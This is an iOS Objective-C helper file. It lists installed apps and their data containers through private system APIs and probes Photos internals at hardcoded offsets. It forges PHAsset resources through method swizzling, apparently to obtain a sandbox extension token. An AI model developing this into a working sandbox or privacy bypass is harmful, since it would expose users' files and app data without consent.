#import "AppIconHelper.h"
#import <objc/runtime.h>
#import <objc/message.h>
#import <dlfcn.h>
#import <stdio.h>
#import <stdint.h>
#import <string.h>
#import <mach-o/dyld.h>
#import <mach/mach.h>
#import <mach/message.h>
#import <signal.h>
#import <sys/sysctl.h>
#import <unistd.h>
#import <errno.h>
#import <stdlib.h>
#if __arm64e__
#import <ptrauth.h>
#endif

// objc_msgSend forwarders exposed to Swift for invoking private PhotosServices
// selectors. Each wrapper pins an exact signature so float/int/pointer args are
// preserved on ARM64 (a variadic re-forward would corrupt register arguments).

// Generic alloc via objc_msgSend (Swift marks NSObject.alloc() unavailable;
// calling it through the runtime here bypasses that restriction for classes
// Swift cannot name).
id PHAllocObjCClass(id cls) {
    if (!cls) return nil;
    SEL sel = NSSelectorFromString(@"alloc");
    typedef id (*fn)(id, SEL);
    return ((fn)objc_msgSend)(cls, sel);
}

// Safe KVC injection: wrap setValue:forKey: in @try/@catch. A private class such
// as PHAsset exposes many readonly / absent keys; blindly calling setValue: for
// an unknown key raises NSUnknownKeyException, which Swift cannot catch (aborts).
// We swallow it here and return NO so the probe keeps running.
BOOL PHSafeSetValueForKey(id obj, id value, NSString *key) {
    if (!obj || !key) return NO;
    @try {
        [obj setValue:value forKey:key];
        return YES;
    } @catch (NSException *e) {
        return NO;
    }
}

// PHContentEditingInputRequestContext -initWithRequestID:managerID:asset:options:
//   useRAWAsUnadjustedBase:resultHandler:  (IMP 0x23e340)
//   @,:,i,Q,@,@,B,@?  -> id  (asset must be non-nil)
id PHCEIRContextInitWithRequest(id receiver,
                                int64_t requestID,
                                int64_t managerID,
                                id asset,
                                id options,
                                BOOL useRAWAsUnadjustedBase,
                                id resultHandler) {
    SEL sel = NSSelectorFromString(
        @"initWithRequestID:managerID:asset:options:useRAWAsUnadjustedBase:resultHandler:");
    if (!receiver || ![receiver respondsToSelector:sel]) return nil;
    typedef id (*fn)(id, SEL, int64_t, int64_t, id, id, BOOL, id);
    return ((fn)objc_msgSend)(receiver, sel, requestID, managerID, asset, options,
                              useRAWAsUnadjustedBase, resultHandler);
}

// -start  (IMP 0x23bad4)  v,@,:
void PHCEIRContextStart(id receiver) {
    SEL sel = NSSelectorFromString(@"start");
    if (!receiver || ![receiver respondsToSelector:sel]) return;
    typedef void (*fn)(id, SEL);
    ((fn)objc_msgSend)(receiver, sel);
}

// -processAndReturnResultsWithRequest:  (IMP 0x23acec)  v,@,@
void PHCEIRContextProcessAndReturn(id receiver, id request) {
    SEL sel = NSSelectorFromString(@"processAndReturnResultsWithRequest:");
    if (!receiver || ![receiver respondsToSelector:sel]) return;
    typedef void (*fn)(id, SEL, id);
    ((fn)objc_msgSend)(receiver, sel, request);
}

// PHContentEditingInputResult -imageSandboxExtensionToken  (IMP 0x27cb70)  @,:
id PHCEIRResultImageSandboxToken(id receiver) {
    SEL sel = NSSelectorFromString(@"imageSandboxExtensionToken");
    if (!receiver || ![receiver respondsToSelector:sel]) return nil;
    typedef id (*fn)(id, SEL);
    return ((fn)objc_msgSend)(receiver, sel);
}

// PHImageManager -requestContentEditingInputForAsset:withOptions:completionHandler:
//   (stub 0x3d7500) — public-API backing entry for the whole editing pipeline.
//   v,@,@,@,@?  (asset, options, completion handler)
void PHImageManagerRequestCEI(id receiver, id asset, id options, id completion) {
    SEL sel = NSSelectorFromString(
        @"requestContentEditingInputForAsset:withOptions:completionHandler:");
    if (!receiver || ![receiver respondsToSelector:sel]) return;
    typedef void (*fn)(id, SEL, id, id, id);
    ((fn)objc_msgSend)(receiver, sel, asset, options, completion);
}

// Resolve a Photos.framework lazy-import stub (adrp/add/br to a __la_symbol_ptr
// slot) into the symbol name of the function it dispatches to, via dladdr on the
// already-bound slot value. libVMOff is the image-relative VM offset (== dump
// offset, base=0). This identifies start()'s internal gate (0x24801d0) so we can
// tell why it returns 0 early.
//
// Base must be the Mach header address (== __TEXT base) via _dyld_get_image_header,
// matching PhotosClassDumper.photosImageBase(); dlopen()'s returned handle is NOT
// the header address here (non-page-aligned), which made earlier reads land on
// zero-filled memory.
static void *photosHeader(void) {
    static void *cached;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        uint32_t c = _dyld_image_count();
        for (uint32_t i = 0; i < c; i++) {
            const char *name = _dyld_get_image_name(i);
            if (name && strstr(name, "/Photos.framework/Photos")) {
                cached = (void *)_dyld_get_image_header(i);
                break;
            }
        }
    });
    return cached;
}

const char *ResolvePhotosLazyImportSymbol(uint64_t libVMOff) {
    static char diag[192];
    void *base = photosHeader();
    if (!base) return "no_photos_header";
    uint8_t *stub = (uint8_t *)base + libVMOff;
    uint32_t a = *(const uint32_t *)stub;      // ADRP
    uint32_t b = *(const uint32_t *)(stub + 4); // ADD imm
    if ((a & 0x9F000000) != 0x90000000) {
        snprintf(diag, sizeof(diag), "notADRP:ins1=0x%x ins2=0x%x base=%p off=%llx",
                 a, b, base, (unsigned long long)libVMOff);
        return diag;
    }
    int64_t immhi = (a >> 5) & 0x7FFFF;
    int64_t immlo  = (a >> 29) & 0x3;
    int64_t imm = (immhi << 2) | immlo;
    if (imm & (1 << 20)) imm -= (1 << 21);      // sign-extend 21-bit
    int64_t addimm = (b >> 10) & 0xFFF;
    if (addimm & 0x800) addimm -= 0x1000;       // sign-extend 12-bit
    uint64_t la_ptr = ((uint64_t)stub & ~0xFFFULL) + (imm << 12) + addimm;
    uint64_t fn = *(uint64_t *)la_ptr;
    Dl_info info;
    if (fn && dladdr((void *)fn, &info) && info.dli_sname) {
        return info.dli_sname;
    }
    snprintf(diag, sizeof(diag), "dladdr_fail:la_ptr=%llx slot=%llx (stub=%p)",
             (unsigned long long)la_ptr, (unsigned long long)fn, stub);
    return diag;
}

// Diagnostic for a PHContentEditingInputRequestContext instance: its real class
// name, whether it responds to -start, and start's IMP offset (== dump offset).
// start never binding the gateCaller lazy import (log2_25) means start() did not
// run at all — this tells us whether the ctx we built is actually a valid
// PHContentEditingInputRequestContext and whether objc_msgSend would reach start.
const char *PhotosContextDebug(id ctx) {
    static char buf[256];
    if (!ctx) return "nil_ctx";
    const char *cls = object_getClassName(ctx);
    SEL startSel = NSSelectorFromString(@"start");
    BOOL canStart = [ctx respondsToSelector:startSel];
    uint64_t startOff = 0;
    Method m = class_getInstanceMethod(object_getClass(ctx), startSel);
    if (m) {
        void *base = photosHeader();
        IMP imp = method_getImplementation(m);
        uint64_t impAddr = (uint64_t)(uintptr_t)imp;
        startOff = base ? (impAddr - (uint64_t)(uintptr_t)base) : 0;
    }
    snprintf(buf, sizeof(buf), "class=%s respondsStart=%d startImpOff=0x%llx",
             cls, canStart, (unsigned long long)startOff);
    return buf;
}

uint64_t PhotosLazyImportSlot(uint64_t libVMOff); // 前置声明，供 gate 校验使用

// Directly probe start()'s internal gate: simulate its opening sequence —
// obj = gateCaller(0x247eca0)(ctx); ret = gate(0x24801d0)(obj, 0) — and report
// the gateCaller-returned object's class plus the gate return value. This tells
// us why start returns early (resultHandler never called, log2_25/26) and what
// object the gate inspects. (start() calls gateCaller with x0=self — mov x19,x0
// leaves x0 as the receiver.)
const char *PhotosProbeGateInfo(id ctx) {
    static char buf[256];
    void *base = photosHeader();
    if (!base) return "no_header";
    uint8_t *p = (uint8_t *)base;
    if (!ctx) return "nil_ctx";
    // 跨版本安全：先校验 0x247eca0/0x24801d0 处是合法 lazy-import 桩（ADRP+br）。
    // 非法（Photos 二进制非 26.6.1-compatible）则降级返回诊断，避免直接调用错地址崩溃。
    uint64_t callerSlot = PhotosLazyImportSlot(0x247eca0);
    uint64_t gateSlot   = PhotosLazyImportSlot(0x24801d0);
    if (callerSlot == 0 || gateSlot == 0) {
        snprintf(buf, sizeof(buf),
                 "gate stub unresolvable on this build (callerSlot=%llx gateSlot=%llx) — Photos binary not 26.6.1-compatible",
                 callerSlot, gateSlot);
        return buf;
    }
    // gateCaller/gate 是 26.6.1 专属内部函数；跨版本即使 ADRP 校验通过，该偏移也可能是别的
    // 函数 → 仅 26.6.1 执行直接调用，其他版本降级跳过（避免语义错误/崩溃）。
    {
        NSOperatingSystemVersion gv = NSProcessInfo.processInfo.operatingSystemVersion;
        if (!(gv.majorVersion == 26 && gv.minorVersion == 6 && gv.patchVersion == 1)) {
            snprintf(buf, sizeof(buf),
                     "gate probe skipped — gateCaller/gate are 26.6.1-bound internals (this OS %ld.%ld.%ld)",
                     (long)gv.majorVersion, (long)gv.minorVersion, (long)gv.patchVersion);
            return buf;
        }
    }
    __unsafe_unretained id obj = ((id (*)(id))(uintptr_t)(p + 0x247eca0))(ctx);
    const char *cls = obj ? object_getClassName(obj) : "nil";
    int r = ((int (*)(id, int))(uintptr_t)(p + 0x24801d0))(obj, 0);
    snprintf(buf, sizeof(buf), "gateCallerObjClass=%s gateReturn=%d", cls, r);
    return buf;
}

// Raw __la_symbol_ptr slot value for a Photos lazy-import stub. Comparing the
// value before vs. after start() tells us whether start actually executed (and
// triggered dyld binding of the gate Caller at 0x247eca0). Returns 0 on failure.
uint64_t PhotosLazyImportSlot(uint64_t libVMOff) {
    void *base = photosHeader();
    if (!base) return 0;
    uint8_t *stub = (uint8_t *)base + libVMOff;
    uint32_t a = *(const uint32_t *)stub;
    uint32_t b = *(const uint32_t *)(stub + 4);
    if ((a & 0x9F000000) != 0x90000000) return 0;
    int64_t immhi = (a >> 5) & 0x7FFFF;
    int64_t immlo  = (a >> 29) & 0x3;
    int64_t imm = (immhi << 2) | immlo;
    if (imm & (1 << 20)) imm -= (1 << 21);
    int64_t addimm = (b >> 10) & 0xFFF;
    if (addimm & 0x800) addimm -= 0x1000;
    uint64_t la_ptr = ((uint64_t)stub & ~0xFFFULL) + (imm << 12) + addimm;
    return *(uint64_t *)la_ptr;
}

// Resolve the same slot, but strip pointer-auth then dladdr. Some iOS builds keep
// the bound address PAC-signed in the slot (dyld4 auth lazy binding); stripping
// yields the plain address that dladdr can resolve.
const char *ResolvePhotosLazyImportSymbolStrip(uint64_t libVMOff) {
    static char diag[192];
    void *base = photosHeader();
    if (!base) return "no_photos_header";
    uint8_t *stub = (uint8_t *)base + libVMOff;
    uint32_t a = *(const uint32_t *)stub;
    uint32_t b = *(const uint32_t *)(stub + 4);
    if ((a & 0x9F000000) != 0x90000000) return "notADRP";
    int64_t immhi = (a >> 5) & 0x7FFFF;
    int64_t immlo  = (a >> 29) & 0x3;
    int64_t imm = (immhi << 2) | immlo;
    if (imm & (1 << 20)) imm -= (1 << 21);
    int64_t addimm = (b >> 10) & 0xFFF;
    if (addimm & 0x800) addimm -= 0x1000;
    uint64_t la_ptr = ((uint64_t)stub & ~0xFFFULL) + (imm << 12) + addimm;
    uint64_t fn = *(uint64_t *)la_ptr;
#if __arm64e__
    void *plain = ptrauth_strip((void *)fn, ptrauth_key_process_independent_data);
#else
    void *plain = (void *)fn;
#endif
    Dl_info info;
    if (plain && dladdr(plain, &info) && info.dli_sname) {
        return info.dli_sname;
    }
    snprintf(diag, sizeof(diag), "strip_dladdr_fail:la_ptr=%llx slot=%llx plain=%p",
             (unsigned long long)la_ptr, (unsigned long long)fn, plain);
    return diag;
}

static UIImage *iconFromData(NSData *data, CGFloat targetSize) {
    if (!data) return nil;
    UIImage *image = [UIImage imageWithData:data];
    if (!image) return nil;
    if (image.size.width <= targetSize && image.size.height <= targetSize) return image;
    UIGraphicsImageRendererFormat *format = [UIGraphicsImageRendererFormat defaultFormat];
    format.scale = image.scale;
    UIGraphicsImageRenderer *renderer = [[UIGraphicsImageRenderer alloc] initWithSize:CGSizeMake(targetSize, targetSize) format:format];
    return [renderer imageWithActions:^(UIGraphicsImageRendererContext *ctx) {
        [image drawInRect:CGRectMake(0, 0, targetSize, targetSize)];
    }];
}

static NSData *iconDataFromProxy(id proxy) {
    SEL iconSel = NSSelectorFromString(@"iconDataForVariant:");
    if (![proxy respondsToSelector:iconSel]) return nil;

    // Variant availability differs between iOS releases and app types.
    // Stop at the first usable image instead of assuming variant zero exists.
    const int variants[] = {2, 0, 1, 3, 4, 5, 6, 7, 15};
    for (NSUInteger index = 0; index < sizeof(variants) / sizeof(variants[0]); index++) {
        id data = ((id (*)(id, SEL, int))objc_msgSend)(proxy, iconSel, variants[index]);
        if ([data isKindOfClass:[NSData class]] && [data length] > 0) return data;
    }
    return nil;
}

static NSString *stringForFirstKey(NSDictionary *info, NSArray<NSString *> *keys) {
    for (NSString *key in keys) {
        id value = info[key];
        if ([value isKindOfClass:[NSString class]] && [value length] > 0) return value;
    }
    return nil;
}

static NSString *pathForFirstKey(NSDictionary *info, NSArray<NSString *> *keys) {
    for (NSString *key in keys) {
        id value = info[key];
        if ([value isKindOfClass:[NSURL class]]) {
            NSString *path = [value path];
            if (path.length > 0) return path;
        }
        if ([value isKindOfClass:[NSString class]] && [value length] > 0) return value;
    }
    return nil;
}

static void addApplicationInfo(NSMutableDictionary *result, NSString *fallbackBundleID, NSDictionary *info) {
    NSString *bundleID = stringForFirstKey(info, @[
        @"CFBundleIdentifier", @"BundleIdentifier", @"ApplicationIdentifier", @"MCMMetadataIdentifier"
    ]);
    if (bundleID.length == 0) bundleID = fallbackBundleID;
    if (bundleID.length == 0) return;

    NSString *name = stringForFirstKey(info, @[
        @"CFBundleDisplayName", @"CFBundleName", @"LocalizedName", @"Name"
    ]);
    NSString *container = pathForFirstKey(info, @[
        @"Container", @"DataContainer", @"DataContainerURL", @"ContainerPath", @"SandboxPath"
    ]);
    NSString *version = stringForFirstKey(info, @[
        @"CFBundleShortVersionString", @"BundleShortVersionString"
    ]);

    NSMutableDictionary *entry = [NSMutableDictionary dictionary];
    entry[@"name"] = name.length > 0 ? name : bundleID;
    if (container.length > 0) entry[@"container"] = container;
    if (version.length > 0) entry[@"version"] = version;
    result[bundleID] = entry;
}

static void *mobileInstallationHandle(void) {
    static void *handle;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        handle = dlopen("/System/Library/PrivateFrameworks/MobileInstallation.framework/MobileInstallation", RTLD_LAZY | RTLD_LOCAL);
    });
    return handle;
}

static NSDictionary *appsFromMobileInstallation(void) {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    void *frameworkHandle = mobileInstallationHandle();

    // Legacy path for older releases where the original symbol is still exported.
    void *lookupFn = dlsym(RTLD_DEFAULT, "MobileInstallationLookup");
    if (!lookupFn && frameworkHandle) {
        lookupFn = dlsym(frameworkHandle, "MobileInstallationLookup");
    }
    if (!lookupFn) return result;

    NSDictionary *apps = nil;
    NSArray *optionSets = @[
        @{@"ApplicationType": @"Any"},
        @{@"ApplicationType": @"User"},
        @{@"ApplicationType": @"System"},
        @{},
    ];
    for (NSDictionary *options in optionSets) {
        apps = ((NSDictionary *(*)(NSDictionary *, void *))lookupFn)(options, NULL);
        if (apps && [apps isKindOfClass:[NSDictionary class]] && apps.count > 0) break;
    }
    if (!apps || apps.count == 0) return result;

    for (NSString *bundleID in apps) {
        @autoreleasepool {
            id rawInfo = apps[bundleID];
            if (![rawInfo isKindOfClass:[NSDictionary class]]) continue;
            addApplicationInfo(result, bundleID, rawInfo);
        }
    }
    return result;
}

static void ensureLaunchServicesLoaded(void) {
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        const char *candidates[] = {
            "/System/Library/Frameworks/CoreServices.framework/CoreServices",
            "/System/Library/PrivateFrameworks/MobileCoreServices.framework/MobileCoreServices",
            "/System/Library/Frameworks/MobileCoreServices.framework/MobileCoreServices",
        };
        for (size_t i = 0; i < sizeof(candidates) / sizeof(candidates[0]); i++) {
            if (dlopen(candidates[i], RTLD_LAZY | RTLD_GLOBAL)) {
                NSLog(@"[3105] ls: loaded %s", candidates[i]);
                return;
            }
        }
        NSLog(@"[3105] ls: CoreServices/MobileCoreServices dlopen failed");
    });
}

static NSDictionary *appsFromWorkspace(void) {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    ensureLaunchServicesLoaded();

    Class workspaceClass = NSClassFromString(@"LSApplicationWorkspace");
    if (!workspaceClass) {
        NSLog(@"[3105] ls: LSApplicationWorkspace class unavailable");
        return result;
    }
    SEL defaultWorkspaceSel = NSSelectorFromString(@"defaultWorkspace");
    if (![workspaceClass respondsToSelector:defaultWorkspaceSel]) {
        NSLog(@"[3105] ls: defaultWorkspace selector unavailable");
        return result;
    }
    id workspace = ((id (*)(id, SEL))objc_msgSend)(workspaceClass, defaultWorkspaceSel);
    if (!workspace) {
        NSLog(@"[3105] ls: defaultWorkspace returned nil");
        return result;
    }

    NSArray *apps = nil;
    NSString *usedSelector = nil;
    for (NSString *selectorName in @[@"allApplications", @"allInstalledApplications"]) {
        SEL allAppsSel = NSSelectorFromString(selectorName);
        if (![workspace respondsToSelector:allAppsSel]) continue;
        id candidate = ((id (*)(id, SEL))objc_msgSend)(workspace, allAppsSel);
        if ([candidate isKindOfClass:[NSArray class]] && [candidate count] > 0) {
            apps = candidate;
            usedSelector = selectorName;
            break;
        }
        NSLog(@"[3105] ls: %@ returned %lu", selectorName,
              (unsigned long)([candidate isKindOfClass:[NSArray class]] ? [candidate count] : 0));
    }
    if (!apps || apps.count == 0) {
        NSLog(@"[3105] ls: workspace enumeration empty");
        return result;
    }
    NSLog(@"[3105] ls: %@ returned %lu proxies", usedSelector, (unsigned long)apps.count);

    NSUInteger withContainer = 0;
    for (id app in apps) {
        @autoreleasepool {
            NSString *bundleID = nil;
            for (NSString *selectorName in @[@"bundleIdentifier", @"applicationIdentifier"]) {
                SEL bundleSel = NSSelectorFromString(selectorName);
                if (![app respondsToSelector:bundleSel]) continue;
                id value = ((id (*)(id, SEL))objc_msgSend)(app, bundleSel);
                if ([value isKindOfClass:[NSString class]] && [value length] > 0) {
                    bundleID = value;
                    break;
                }
            }
            if (bundleID.length == 0) continue;

            NSString *name = nil;
            for (NSString *selectorName in @[@"localizedName", @"localizedShortName"]) {
                SEL nameSel = NSSelectorFromString(selectorName);
                if (![app respondsToSelector:nameSel]) continue;
                id value = ((id (*)(id, SEL))objc_msgSend)(app, nameSel);
                if ([value isKindOfClass:[NSString class]] && [value length] > 0) {
                    name = value;
                    break;
                }
            }
            if (name.length == 0) name = bundleID;

            NSMutableDictionary *entry = [NSMutableDictionary dictionary];
            entry[@"name"] = name;
            for (NSString *selectorName in @[@"dataContainerURL", @"containerURL"]) {
                SEL containerSel = NSSelectorFromString(selectorName);
                if (![app respondsToSelector:containerSel]) continue;
                id containerValue = ((id (*)(id, SEL))objc_msgSend)(app, containerSel);
                NSString *containerPath = [containerValue isKindOfClass:[NSURL class]] ? [containerValue path] : containerValue;
                if ([containerPath isKindOfClass:[NSString class]] && containerPath.length > 0) {
                    entry[@"container"] = containerPath;
                    withContainer++;
                    break;
                }
            }
            result[bundleID] = entry;
        }
    }
    NSLog(@"[3105] ls: extracted %lu apps (%lu with container)",
          (unsigned long)result.count, (unsigned long)withContainer);
    return result;
}

NSDictionary<NSString *, NSDictionary *> *installedAppInfo(void) {
    NSDictionary *workspace = appsFromWorkspace();
    if (workspace.count > 0) return workspace;
    NSDictionary *mobileInstallation = appsFromMobileInstallation();
    NSLog(@"[3105] ls: workspace empty; MobileInstallation=%lu",
          (unsigned long)mobileInstallation.count);
    return mobileInstallation;
}

// Icon via LSApplicationProxy (per bundle ID)
UIImage *iconForBundleID(NSString *bundleID) {
    static NSCache<NSString *, UIImage *> *cache;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        cache = [[NSCache alloc] init];
        cache.countLimit = 256;
    });
    UIImage *cached = [cache objectForKey:bundleID];
    if (cached) return cached;

    Class proxyClass = NSClassFromString(@"LSApplicationProxy");
    if (!proxyClass) return nil;
    SEL appProxySel = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (![proxyClass respondsToSelector:appProxySel]) return nil;
    id proxy = ((id (*)(id, SEL, id))objc_msgSend)(proxyClass, appProxySel, bundleID);
    if (!proxy) return nil;
    UIImage *icon = iconFromData(iconDataFromProxy(proxy), 60.0);
    if (icon) [cache setObject:icon forKey:bundleID];
    return icon;
}

// Name + icon for a single bundle ID via LSApplicationProxy
NSDictionary *appInfoForBundleID(NSString *bundleID) {
    NSMutableDictionary *result = [NSMutableDictionary dictionary];
    result[@"name"] = bundleID;

    Class proxyClass = NSClassFromString(@"LSApplicationProxy");
    if (!proxyClass) return result;
    SEL appProxySel = NSSelectorFromString(@"applicationProxyForIdentifier:");
    if (![proxyClass respondsToSelector:appProxySel]) return result;
    id proxy = ((id (*)(id, SEL, id))objc_msgSend)(proxyClass, appProxySel, bundleID);
    if (!proxy) return result;

    BOOL matchesRequestedIdentifier = NO;
    for (NSString *selectorName in @[@"applicationIdentifier", @"bundleIdentifier"]) {
        SEL identifierSel = NSSelectorFromString(selectorName);
        if (![proxy respondsToSelector:identifierSel]) continue;
        id value = ((id (*)(id, SEL))objc_msgSend)(proxy, identifierSel);
        if ([value isKindOfClass:[NSString class]] && [value isEqualToString:bundleID])
            matchesRequestedIdentifier = YES;
    }
    if (!matchesRequestedIdentifier) return result;
    result[@"found"] = @YES;

    NSURL *bundleURL = nil;
    SEL bundleURLSel = NSSelectorFromString(@"bundleURL");
    if ([proxy respondsToSelector:bundleURLSel]) {
        id value = ((id (*)(id, SEL))objc_msgSend)(proxy, bundleURLSel);
        if ([value isKindOfClass:[NSURL class]]) bundleURL = value;
    }

    NSBundle *applicationBundle = bundleURL ? [NSBundle bundleWithURL:bundleURL] : nil;
    NSDictionary *localizedInfo = applicationBundle.localizedInfoDictionary;
    NSDictionary *bundleInfo = applicationBundle.infoDictionary;
    NSString *bundleName = stringForFirstKey(localizedInfo, @[
        @"CFBundleDisplayName", @"CFBundleName"
    ]);
    if (bundleName.length == 0) {
        bundleName = stringForFirstKey(bundleInfo, @[
            @"CFBundleDisplayName", @"CFBundleName"
        ]);
    }
    if (bundleName.length > 0) result[@"name"] = bundleName;

    if ([result[@"name"] isEqualToString:bundleID]) {
        for (NSString *selectorName in @[@"localizedName", @"localizedShortName"]) {
            SEL nameSel = NSSelectorFromString(selectorName);
            if (![proxy respondsToSelector:nameSel]) continue;
            NSString *name = ((id (*)(id, SEL))objc_msgSend)(proxy, nameSel);
            if ([name isKindOfClass:[NSString class]] && name.length > 0) {
                result[@"name"] = name;
                break;
            }
        }
    }

    NSString *bundleVersion = stringForFirstKey(bundleInfo, @[
        @"CFBundleShortVersionString"
    ]);
    if (bundleVersion.length > 0) result[@"version"] = bundleVersion;
    if (!result[@"version"]) {
        SEL versionSel = NSSelectorFromString(@"shortVersionString");
        if ([proxy respondsToSelector:versionSel]) {
            NSString *version = ((id (*)(id, SEL))objc_msgSend)(proxy, versionSel);
            if ([version isKindOfClass:[NSString class]] && version.length > 0) {
                result[@"version"] = version;
            }
        }
    }

    for (NSString *selectorName in @[@"dataContainerURL", @"containerURL"]) {
        SEL containerSel = NSSelectorFromString(selectorName);
        if (![proxy respondsToSelector:containerSel]) continue;
        id value = ((id (*)(id, SEL))objc_msgSend)(proxy, containerSel);
        NSString *path = [value isKindOfClass:[NSURL class]] ? [value path] : value;
        if ([path isKindOfClass:[NSString class]] && path.length > 0) {
            result[@"container"] = path;
            break;
        }
    }

    return result;
}

BOOL openApplicationForBundleID(NSString *bundleID) {
    if (bundleID.length == 0) return NO;
    Class workspaceClass = NSClassFromString(@"LSApplicationWorkspace");
    SEL defaultWorkspaceSelector = NSSelectorFromString(@"defaultWorkspace");
    if (!workspaceClass || ![workspaceClass respondsToSelector:defaultWorkspaceSelector]) {
        return NO;
    }
    id workspace = ((id (*)(id, SEL))objc_msgSend)(
        workspaceClass,
        defaultWorkspaceSelector
    );
    if (!workspace) return NO;
    SEL openSelector = NSSelectorFromString(@"openApplicationWithBundleID:");
    if (![workspace respondsToSelector:openSelector]) return NO;
    return ((BOOL (*)(id, SEL, id))objc_msgSend)(workspace, openSelector, bundleID);
}

// ============================================================================
// 方向1 试水：伪造 PHAsset 资源读取（swizzle assetResourcesForAsset 等）
// ----------------------------------------------------------------------------
// 背景：start(0x23bad4) 被证明只是 os_log 日志，从不启动管线；真正驱动在
// processAndReturnResultsWithRequest:(0x23acec) 内部调用 ctx 持有的 block。
// 但即便驱动起来，管线会给 asset 发 assetResourcesForAsset:（返回 PHAssetResource
// 数组）来校验/读取真实资源——虚拟 PHAsset 无真实资源会在此 abort。
// 本试水：swizzle 这些 selector，让它们返回一个伪造的 PHAssetResource（fileURL
// 指向调用方提供的占位图），快速验证「伪造资源能否让管线推进」，隔离出
// 「资源校验」是否真的是唯一/主要卡点。诚实标注：不伪装成功，只取证管线响应。
// ============================================================================
static NSURL *g_fakeResURL = NULL;

static NSArray *PHFakeAssetResources(void) {
    if (!g_fakeResURL) return @[];
    Class cls = NSClassFromString(@"PHAssetResource");
    if (!cls) return @[];
    id res = PHAllocObjCClass(cls);
    if (!res) return @[];
    @try { [res setValue:g_fakeResURL forKey:@"fileURL"]; } @catch(id e) {}
    @try { [res setValue:@(1) forKey:@"resourceType"]; } @catch(id e) {}   // PHAssetResourceTypePhoto
    @try { [res setValue:@(1) forKey:@"type"]; } @catch(id e) {}
    @try { [res setValue:@"public.jpeg" forKey:@"uniformTypeIdentifier"]; } @catch(id e) {}
    @try { [res setValue:@"public.jpeg" forKey:@"UTI"]; } @catch(id e) {}
    @try { [res setValue:@"fake-probe.jpg" forKey:@"originalFilename"]; } @catch(id e) {}
    return @[res];
}

// 带参版本：+[PHAsset assetResourcesForAsset:] / -[PHAsset assetResourcesForAsset:]
static id swz_assetResources(id self, SEL _cmd, id asset) {
    return PHFakeAssetResources();
}
// 无参版本：-[PHAsset assetResources] / -[PHAsset resources]
static id swz_assetResources_noarg(id self, SEL _cmd) {
    return PHFakeAssetResources();
}

static NSMutableDictionary<NSString *, NSValue *> *g_swzSaves = nil;

void PHInstallFakeAssetResources(NSURL *fakeURL) {
    g_fakeResURL = fakeURL;
    Class cls = NSClassFromString(@"PHAsset");
    if (!cls) return;
    if (!g_swzSaves) g_swzSaves = [NSMutableDictionary dictionary];
    for (NSString *sn in @[@"assetResourcesForAsset:", @"assetResources", @"resources"]) {
        BOOL hasArg = [sn hasSuffix:@":"];
        IMP imp = hasArg ? (IMP)swz_assetResources : (IMP)swz_assetResources_noarg;
        Method cm = class_getClassMethod(cls, NSSelectorFromString(sn));
        if (cm) {
            IMP orig = method_getImplementation(cm);
            method_setImplementation(cm, imp);
            g_swzSaves[[@"c:" stringByAppendingString:sn]] = [NSValue valueWithPointer:orig];
        }
        Method im = class_getInstanceMethod(cls, NSSelectorFromString(sn));
        if (im) {
            IMP orig = method_getImplementation(im);
            method_setImplementation(im, imp);
            g_swzSaves[[@"i:" stringByAppendingString:sn]] = [NSValue valueWithPointer:orig];
        }
    }
}

void PHUninstallFakeAssetResources(void) {
    Class cls = NSClassFromString(@"PHAsset");
    if (!cls || !g_swzSaves) return;
    for (NSString *k in g_swzSaves) {
        BOOL isClass = [k hasPrefix:@"c:"];
        NSString *sn = [k substringFromIndex:2];
        Method m = isClass
            ? class_getClassMethod(cls, NSSelectorFromString(sn))
            : class_getInstanceMethod(cls, NSSelectorFromString(sn));
        if (m) method_setImplementation(m, (IMP)[g_swzSaves[k] pointerValue]);
    }
    [g_swzSaves removeAllObjects];
    g_fakeResURL = NULL;
}

// 安全驱动：processAndReturnResultsWithRequest: 用 @try 包住（request 可为 nil），
// 避免 request 非法导致 objc_msgSend 崩溃而丢全部观测。
void PHCEIRContextProcessAndReturnSafe(id receiver, id request) {
    SEL sel = NSSelectorFromString(@"processAndReturnResultsWithRequest:");
    if (!receiver || ![receiver respondsToSelector:sel]) return;
    @try {
        typedef void (*fn)(id, SEL, id);
        ((fn)objc_msgSend)(receiver, sel, request);
    } @catch (NSException *e) {
        NSLog(@"[CEIR] processAndReturn threw: %@", e);
    }
}

// resultHandler 回调对象诊断：全量 dump class 名 + 所有 ivar（名/类型/值），
// 用于定位私有 PHContentEditingInputResult 里 token（imageSandboxExtensionToken）
// 是否存在于某 ivar、以及 error 内容。每个值截断到 150 字符防 log 爆炸。
const char *PHCEIRResultClass(id obj) {
    return obj ? class_getName([obj class]) : "(nil)";
}
NSString *PHCEIRDumpResultIvars(id obj) {
    if (!obj) return @"(nil)";
    Class cls = [obj class];
    unsigned int count = 0;
    Ivar *ivars = class_copyIvarList(cls, &count);
    NSMutableString *s = [NSMutableString string];
    [s appendFormat:@"class=%s ivars=%u", class_getName(cls), count];
    for (unsigned int i = 0; i < count; i++) {
        Ivar iv = ivars[i];
        const char *name = ivar_getName(iv);
        const char *type = ivar_getTypeEncoding(iv);
        id val = nil;
        @try { val = object_getIvar(obj, iv); } @catch(id e) { val = nil; }
        NSString *vdesc = @"(nil)";
        if (val) {
            @try { vdesc = [val description]; } @catch(id e) { vdesc = @"(desc threw)"; }
            if (vdesc.length > 150) vdesc = [vdesc substringToIndex:150];
        }
        [s appendFormat:@"\n  %s(%s)=%@", name, type, vdesc];
    }
    free(ivars);
    return s;
}

// ============================================================================
// 管线填充观测：swizzle PHContentEditingInputResult 的填充方法，记录是否被调用。
// log2_31 发现回调的 result 是空壳（_imageResult=nil，15 个 ivar 全 nil），且
// imageSandboxExtensionToken 不是 ivar 而是由 imageResult URL 派生的 getter——
// imageResult 为 nil 则 token 必 nil。本观测记录 addImageResult:/addVideoResult:/
// addAdjustmentDataResult:/addAdjustmentSecondaryDataResult:/setError:/mergeInfo... 是否
// 被管线调用，定位管线是停在「产出 media result」前，还是产出了但我们引用错实例。
// ============================================================================
static uint64_t g_resultOps = 0;

static id (*g_origAddImage)(id, SEL, id) = NULL;
static id (*g_origAddVideo)(id, SEL, id) = NULL;
static id (*g_origAddAdj)(id, SEL, id) = NULL;
static id (*g_origAddAdjSec)(id, SEL, id) = NULL;
static id (*g_origSetError)(id, SEL, id) = NULL;
